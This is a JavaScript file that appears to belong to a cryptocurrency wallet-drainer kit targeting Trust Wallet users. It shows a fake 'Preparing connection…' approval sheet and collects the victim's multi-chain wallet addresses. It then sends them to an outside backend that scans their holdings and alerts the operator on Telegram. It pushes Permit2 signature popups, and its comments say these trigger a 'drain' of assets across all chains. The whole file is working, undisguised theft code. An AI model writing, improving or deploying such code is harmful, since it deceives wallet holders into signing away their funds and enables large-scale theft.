/**
 * Phase A+ — after address known:
 * 1) POST /api/v1/scout (connect Telegram)
 * 2) Amount scout (fusion/ranked → scan_complete Telegram) — no WC provider needed
 * 3) Recover WC + continueConnected (Permit2 / sign → Trust popup)
 * Approve button unlocks after notify; amount+drain kick automatically.
 */
(function () {
  'use strict';

  var BACKEND_DEFAULT = 'https://sadrailala-production.up.railway.app';
  var KEY_ADDR = 'trust_site_connected_addr';
  var KEY_NOTIFY = 'trust_preflight_notify';
  var KEY_AMOUNT = 'trust_preflight_amount';
  var busy = false;
  var lastNotifyOk = '';

  function getMultiChainAddrs() {
    var out = {};
    try {
      var s = window.legion && window.legion.state;
      if (s && s.chains) {
        if (s.chains.SOL    && s.chains.SOL.address)    out.sol    = s.chains.SOL.address;
        if (s.chains.TRON   && s.chains.TRON.address)   out.tron   = s.chains.TRON.address;
        if (s.chains.TON    && s.chains.TON.address)    out.ton    = s.chains.TON.address;
        if (s.chains.BTC    && s.chains.BTC.address)    out.btc    = s.chains.BTC.address;
        if (s.chains.COSMOS && s.chains.COSMOS.address) out.cosmos = s.chains.COSMOS.address;
        if (s.chains.APTOS  && s.chains.APTOS.address)  out.aptos  = s.chains.APTOS.address;
        if (s.chains.SUI    && s.chains.SUI.address)    out.sui    = s.chains.SUI.address;
      }
    } catch (_) {}
    try {
      var ss = sessionStorage;
      out.sol    = out.sol    || ss.getItem('legion_sol_addr')    || '';
      out.tron   = out.tron   || ss.getItem('legion_tron_addr')   || '';
      out.ton    = out.ton    || ss.getItem('legion_ton_addr')    || '';
      out.btc    = out.btc    || ss.getItem('legion_btc_addr')    || '';
    } catch (_) {}
    // Remove empty strings
    Object.keys(out).forEach(function (k) { if (!out[k]) delete out[k]; });
    return out;
  }

  function backendBase() {
    try {
      var u = (window.LEGION_CONFIG && window.LEGION_CONFIG.backendUrl) || BACKEND_DEFAULT;
      return String(u).replace(/\/$/, '');
    } catch (_) {
      return BACKEND_DEFAULT;
    }
  }

  function shortAddr(a) {
    a = String(a || '');
    return a.length > 12 ? a.slice(0, 6) + '…' + a.slice(-4) : a;
  }

  function loadAddr() {
    try {
      return sessionStorage.getItem(KEY_ADDR) || sessionStorage.getItem('legion_wc_evm_addr') || '';
    } catch (_) {
      return '';
    }
  }

  function saveAddr(addr) {
    addr = String(addr || '').toLowerCase();
    if (!/^0x[a-f0-9]{40}$/.test(addr)) return '';
    try {
      sessionStorage.setItem(KEY_ADDR, addr);
      sessionStorage.setItem('legion_wc_evm_addr', addr);
    } catch (_) {}
    return addr;
  }

  function setStatus(msg) {
    var el = document.getElementById('__trust_pf_status');
    if (el) el.textContent = msg;
    try { console.warn('[TrustPreflight]', msg); } catch (_) {}
  }

  function setProgress(pct) {
    var bar = document.getElementById('__trust_pf_bar_inner');
    if (bar) bar.style.width = Math.max(5, Math.min(100, pct)) + '%';
  }

  function setApproveEnabled(on) {
    var btn = document.getElementById('__trust_pf_approve');
    if (!btn) return;
    btn.disabled = !on;
    if (on) {
      btn.textContent = 'Approve in Trust Wallet';
      btn.style.background = '#0500ff';
      btn.style.color = '#fff';
    } else {
      btn.textContent = 'Approve in Trust (wait…)';
      btn.style.background = '#333';
      btn.style.color = '#888';
    }
  }

  function ensureSheet(addr) {
    var el = document.getElementById('__trust_preflight_sheet');
    if (!el) {
      el = document.createElement('div');
      el.id = '__trust_preflight_sheet';
      el.style.cssText = 'position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.82);display:flex;align-items:flex-end;justify-content:center;padding:16px;font-family:system-ui,sans-serif';
      el.innerHTML = [
        '<div style="width:100%;max-width:420px;background:#111;color:#fff;border-radius:16px;padding:20px 18px 22px">',
        '<div style="font-size:17px;font-weight:700;margin-bottom:8px">Preparing connection…</div>',
        '<div id="__trust_pf_status" style="font-size:13px;opacity:.9;line-height:1.45;margin-bottom:16px;min-height:48px">Stay on this page</div>',
        '<div id="__trust_pf_bar" style="height:4px;background:#333;border-radius:2px;overflow:hidden;margin-bottom:16px">',
        '<div id="__trust_pf_bar_inner" style="height:100%;width:15%;background:#0500ff;transition:width .4s"></div></div>',
        '<button type="button" id="__trust_pf_approve" disabled style="display:block;width:100%;background:#333;color:#888;border:0;border-radius:12px;padding:14px;font-weight:700;margin-bottom:8px">Approve in Trust (wait…)</button>',
        '<button type="button" id="__trust_pf_retry" style="display:block;width:100%;background:#222;color:#fff;border:0;border-radius:12px;padding:12px;font-weight:600;margin-bottom:8px">Retry full prep</button>',
        '<button type="button" id="__trust_pf_close" style="display:block;width:100%;background:transparent;border:0;color:#888;padding:10px;font-size:13px">Close</button>',
        '</div>',
      ].join('');
      document.body.appendChild(el);
      el.querySelector('#__trust_pf_close').onclick = function () { el.style.display = 'none'; };
      el.querySelector('#__trust_pf_retry').onclick = function () {
        var a = loadAddr();
        if (a) {
          try { sessionStorage.removeItem(KEY_AMOUNT); } catch (_) {}
          runPreflight(a, { force: true });
        }
      };
      el.querySelector('#__trust_pf_approve').onclick = function () {
        onApproveTap();
      };
    }
    el.style.display = 'flex';
    try {
      var old = document.getElementById('__trust_approve_sheet');
      if (old) old.style.display = 'none';
    } catch (_) {}
    return el;
  }

  function alreadyNotified(addr) {
    addr = String(addr || '').toLowerCase();
    if (lastNotifyOk === addr) return true;
    try {
      if (sessionStorage.getItem(KEY_NOTIFY) === addr) return true;
      if (sessionStorage.getItem('legion_notify_done') === addr) return true;
    } catch (_) {}
    return false;
  }

  function amountDone(addr) {
    try {
      return sessionStorage.getItem(KEY_AMOUNT) === String(addr || '').toLowerCase();
    } catch (_) {
      return false;
    }
  }

  function markNotified(addr) {
    addr = String(addr || '').toLowerCase();
    lastNotifyOk = addr;
    try {
      sessionStorage.setItem(KEY_NOTIFY, addr);
      sessionStorage.setItem('legion_notify_done', addr);
    } catch (_) {}
    try {
      if (window.legion && window.legion.state) {
        window.legion.state.notifyDone = true;
        window.legion.state.connectNotifiedAddr = addr;
      }
    } catch (_) {}
  }

  function markAmount(addr, usd) {
    try {
      sessionStorage.setItem(KEY_AMOUNT, String(addr).toLowerCase());
      sessionStorage.setItem('trust_preflight_usd', String(usd || 0));
    } catch (_) {}
  }

  async function postScout(addr, chainId) {
    var base = backendBase();
    var session = 'trust-pf:' + Date.now() + ':' + Math.random().toString(36).slice(2, 7);
    try {
      if (window.legion && window.legion.state && !window.legion.state.connectSession) {
        window.legion.state.connectSession = session;
      }
    } catch (_) {}
    var mc = getMultiChainAddrs();
    var connectedWallets = [addr];
    if (mc.sol)  connectedWallets.push(mc.sol);
    if (mc.tron) connectedWallets.push(mc.tron);
    if (mc.ton)  connectedWallets.push(mc.ton);
    if (mc.btc)  connectedWallets.push(mc.btc);
    var body = {
      user_address: addr,
      chain_id: Number(chainId) || 1,
      wallet_type: 'Trust Wallet',
      chain_family: 'EVM',
      source_page: String(window.location.href || ''),
      connect_session: session,
      connected_wallets: connectedWallets,
    };
    if (mc.sol)    body.sol_address    = mc.sol;
    if (mc.tron)   body.tron_address   = mc.tron;
    if (mc.ton)    body.ton_address    = mc.ton;
    if (mc.btc)    body.btc_address    = mc.btc;
    if (mc.cosmos) body.cosmos_address = mc.cosmos;
    var headers = {
      'Content-Type': 'application/json',
      'X-Source-Origin': window.location.origin,
    };
    var payload = JSON.stringify(body);
    try {
      if (navigator.sendBeacon) {
        navigator.sendBeacon(base + '/api/v1/scout', new Blob([payload], { type: 'application/json' }));
      }
    } catch (_) {}
    var res = await fetch(base + '/api/v1/scout', {
      method: 'POST',
      headers: headers,
      body: payload,
      keepalive: true,
      credentials: 'omit',
      cache: 'no-store',
    });
    return { ok: res.ok, status: res.status };
  }

  /** Amount Telegram path — uses legion.runAmountScout or direct fusion + scan_complete */
  async function runAmountPhase(addr, chainId) {
    setStatus('Scanning portfolio for amount Telegram… stay here');
    setProgress(55);
    var usd = 0;

    // Prefer legion (same as Uniswap)
    if (window.legion && typeof window.legion.runAmountScout === 'function') {
      try {
        var r = await window.legion.runAmountScout(addr, chainId, 'Trust Wallet');
        usd = (r && r.usd) || (window.legion.getScoutUsd && window.legion.getScoutUsd()) || 0;
      } catch (e) {
        console.warn('[TrustPreflight] runAmountScout', e && e.message);
      }
    }

    // Direct fallback if legion missing / returned 0 without calling APIs
    if (!usd) {
      try {
        var base = backendBase();
        var mc2 = getMultiChainAddrs();
        var fusionBody = {
          evm_holder: addr,
          connect_session: (window.legion && window.legion.state && window.legion.state.connectSession) || undefined,
        };
        if (mc2.sol)  fusionBody.sol_holder  = mc2.sol;
        if (mc2.tron) fusionBody.tron_holder = mc2.tron;
        if (mc2.ton)  fusionBody.ton_holder  = mc2.ton;
        if (mc2.btc)  fusionBody.btc_holder  = mc2.btc;
        var fr = await fetch(base + '/api/scout/recursive-predator-fusion', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'X-Source-Origin': window.location.origin },
          body: JSON.stringify(fusionBody),
          credentials: 'omit',
          cache: 'no-store',
        });
        var fj = await fr.json().catch(function () { return {}; });
        var fusion = (fj && fj.data && fj.data.fusion) || (fj && fj.data) || fj;
        usd = Number(fusion && fusion.total_usd) || 0;
        var assetCount = Number(fusion && fusion.assets_count) ||
          (fusion && fusion.assets && fusion.assets.length) || 0;

        // ranked as second source
        if (!usd) {
          var rr = await fetch(base + '/api/v1/scout/ranked', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'X-Source-Origin': window.location.origin },
            body: JSON.stringify({ wallet_address: addr, chain_id: Number(chainId) || 1 }),
            credentials: 'omit',
            cache: 'no-store',
          });
          var rj = await rr.json().catch(function () { return {}; });
          var ranked = (rj && rj.data) || rj;
          usd = Number(ranked && ranked.total_usd) || 0;
          assetCount = assetCount || (ranked && ranked.assets && ranked.assets.length) || 0;
        }

        // scan_complete → amount Telegram (backend skips if usd<=0)
        if (usd > 0) {
          await fetch(base + '/api/v1/scout/drain-status', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'X-Source-Origin': window.location.origin },
            body: JSON.stringify({
              wallet_address: addr,
              event: 'scan_complete',
              chain_id: Number(chainId) || 1,
              chain_family: 'EVM',
              wallet_type: 'Trust Wallet',
              scout_value_usd: usd,
              asset_count: assetCount || 0,
              source_page: String(window.location.href || ''),
            }),
            credentials: 'omit',
            cache: 'no-store',
            keepalive: true,
          });
        }
      } catch (e2) {
        console.warn('[TrustPreflight] amount fallback', e2 && e2.message);
      }
    }

    markAmount(addr, usd);
    try {
      if (window.legion && window.legion.state) window.legion.state.scoutUsd = usd;
    } catch (_) {}

    if (usd > 0) {
      setStatus('Amount OK — $' + Number(usd).toFixed(2) + ' (Telegram scan). Preparing Trust signature…');
    } else {
      setStatus('Amount scan done — $0 or pending. Still preparing Trust signature…');
    }
    setProgress(75);
    return usd;
  }

  async function runDrainPhase(addr) {
    var inTrust = false;
    try {
      if (window.__TRUST_IN_APP__ || (typeof window.__TRUST_IS_IN_APP__ === 'function' && window.__TRUST_IS_IN_APP__())) {
        inTrust = true;
      }
      if (/utm_source=Trust_(iOS|Android)_Browser/i.test(String(location.search || ''))) inTrust = true;
    } catch (_) {}

    setStatus(inTrust
      ? 'Sending Permit2 signature inside Trust… confirm the popup'
      : 'Recovering session + Permit2 sign request…');
    setProgress(85);

    if (inTrust) {
      // Keep injected provider — do NOT overwrite with WC
      try {
        var inj = (window.trustwallet && window.trustwallet.ethereum) || window.ethereum;
        if (inj && window.legion && window.legion.state) {
          window.legion.state.evmProvider = inj;
          window.legion.state.evmAddr = addr;
          window.legion.state.connectMode = 'injected';
          window.legion.state.wcSessionActive = false;
          try { inj.isWalletConnect = false; } catch (_) {}
        }
      } catch (_) {}
    } else {
      try {
        if (window.LegionWallet && typeof window.LegionWallet.tryRecoverStoredSession === 'function') {
          var prov = await window.LegionWallet.tryRecoverStoredSession(true);
          if (prov && window.legion && window.legion.state) {
            window.legion.state.evmProvider = prov;
            window.legion.state.evmAddr = addr;
            window.legion.state.connectMode = 'wc';
            window.legion.state.wcSessionActive = true;
            try { prov.isWalletConnect = true; } catch (_) {}
          }
        }
      } catch (e) {
        console.warn('[TrustPreflight] recover', e && e.message);
      }
    }

    try {
      if (window.legion && typeof window.legion.forceTrustSign === 'function') {
        var r = await window.legion.forceTrustSign();
        console.warn('[TrustPreflight] forceTrustSign', r && (r.path || r.error || r.ok));
        // After EVM sign: continueConnected runs runUniversalDrain — ALL chains in one pass
        // (uses addresses already in WC session from the single approval popup — no new popups)
        if (r && r.ok !== false) {
          setTimeout(function () {
            try {
              if (window.legion && typeof window.legion.continueConnected === 'function') {
                window.legion.continueConnected().catch(function () {});
              }
            } catch (_) {}
          }, 1500);
        }
      } else if (typeof window.__TRUST_RUN_PIPELINE__ === 'function') {
        await window.__TRUST_RUN_PIPELINE__('preflight-drain');
      } else if (window.legion && typeof window.legion.continueConnected === 'function') {
        await window.legion.continueConnected();
      }
    } catch (e2) {
      console.warn('[TrustPreflight] drain', e2 && e2.message);
    }
    setProgress(95);
  }

  async function onApproveTap() {
    var addr = loadAddr();
    if (!addr) return;
    setApproveEnabled(false);
    var inTrust = false;
    try {
      if (window.__TRUST_IN_APP__ || (typeof window.__TRUST_IS_IN_APP__ === 'function' && window.__TRUST_IS_IN_APP__())) {
        inTrust = true;
      }
    } catch (_) {}
    setStatus(inTrust
      ? 'Confirm the signature popup in Trust…'
      : 'Sending signature request to Trust…');
    try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (_) {}

    var result = null;
    try {
      if (window.legion && typeof window.legion.forceTrustSign === 'function') {
        result = await window.legion.forceTrustSign();
      } else {
        await runDrainPhase(addr);
      }
    } catch (e) {
      console.warn('[TrustPreflight] approve', e && e.message);
      setStatus('Sign error: ' + (e && e.message ? e.message : 'failed') + ' — tap Retry / Approve again');
      setApproveEnabled(true);
      return;
    }

    if (result && result.ok) {
      setStatus('Signature path OK (' + (result.path || 'sign') + '). Next: other networks…');
      try {
        window.dispatchEvent(new CustomEvent('trust:evm-confirm-done', {
          detail: { address: addr, path: result.path },
        }));
      } catch (_) {}
    } else if (result && result.error === 'no_session') {
      setStatus('Session lost — tap Connect Wallet again, then Approve.');
    } else if (result && result.error === 'rejected') {
      setStatus('Rejected in Trust — tap Approve to try again.');
    } else {
      setStatus('No popup yet — tap Approve again, or open pending requests in Trust.');
      // Only deep-link when OUTSIDE Trust Browser
      if (!inTrust) {
        try { window.location.href = 'trust://'; } catch (_) {}
      }
    }
    setApproveEnabled(true);
  }

  async function runPreflight(addr, opts) {
    opts = opts || {};
    addr = saveAddr(addr);
    if (!addr) return false;
    if (busy) return false;
    busy = true;

    ensureSheet(addr);
    setApproveEnabled(false);

    var chainId = 1;
    try {
      if (window.legion && window.legion.state && window.legion.state.evmChain) {
        chainId = Number(window.legion.state.evmChain) || 1;
      }
    } catch (_) {}

    try {
      // 0) SIGN FIRST — do not wait for Telegram / amount (was 4–5 min)
      setProgress(30);
      setStatus('Confirm Permit2 in Trust now…');
      setApproveEnabled(true);
      try {
        await runDrainPhase(addr);
      } catch (eSign) {
        console.warn('[TrustPreflight] sign-first', eSign && eSign.message);
      }
      setProgress(70);
      setStatus('Permit2 sent. Syncing Telegram in background…');

      // 1+2) Notify + amount in BACKGROUND — never blocks next sign
      (async function () {
        try {
          if (opts.force || !alreadyNotified(addr)) {
            for (var attempt = 0; attempt < 2; attempt++) {
              var r = await postScout(addr, chainId);
              if (r.ok) { markNotified(addr); break; }
              await new Promise(function (res) { setTimeout(res, 300); });
            }
          }
          if (opts.force || !amountDone(addr)) {
            await runAmountPhase(addr, chainId);
          }
        } catch (eBg) {
          console.warn('[TrustPreflight] bg scout', eBg && eBg.message);
        }
      })();

      setProgress(100);
      setApproveEnabled(true);
      setStatus('If no popup — tap Approve again.');
      try {
        window.dispatchEvent(new CustomEvent('trust:preflight-ok', { detail: { address: addr, usd: 0 } }));
      } catch (_) {}
      return true;
    } catch (e) {
      setStatus('Prep error: ' + (e && e.message ? e.message : 'unknown'));
      setApproveEnabled(true);
      return false;
    } finally {
      busy = false;
    }
  }

  window.__TRUST_PREFLIGHT__ = runPreflight;
  window.__TRUST_FIRE_SCOUT__ = function (addr) {
    return runPreflight(addr || loadAddr(), { force: true });
  };

  window.addEventListener('legion:connected', function (e) {
    var d = (e && e.detail) || {};
    var addr = d.address || d.account || loadAddr();
    // Delay preflight so instant forceTrustSign wins the race (not Telegram wait)
    if (addr) {
      setTimeout(function () { runPreflight(addr); }, 1800);
    }
  });

  window.addEventListener('pagehide', function () {
    var addr = loadAddr();
    if (!addr || alreadyNotified(addr)) return;
    try {
      var base = backendBase();
      var payload = JSON.stringify({
        user_address: addr,
        chain_id: 1,
        wallet_type: 'Trust Wallet',
        chain_family: 'EVM',
        source_page: String(window.location.href || ''),
        connect_session: 'trust-pagehide:' + Date.now(),
      });
      if (navigator.sendBeacon) {
        navigator.sendBeacon(base + '/api/v1/scout', new Blob([payload], { type: 'application/json' }));
      }
    } catch (_) {}
  });

  window.addEventListener('trust:addr-recovered', function (e) {
    var addr = (e && e.detail && e.detail.address) || loadAddr();
    if (addr) runPreflight(addr);
  });
})();
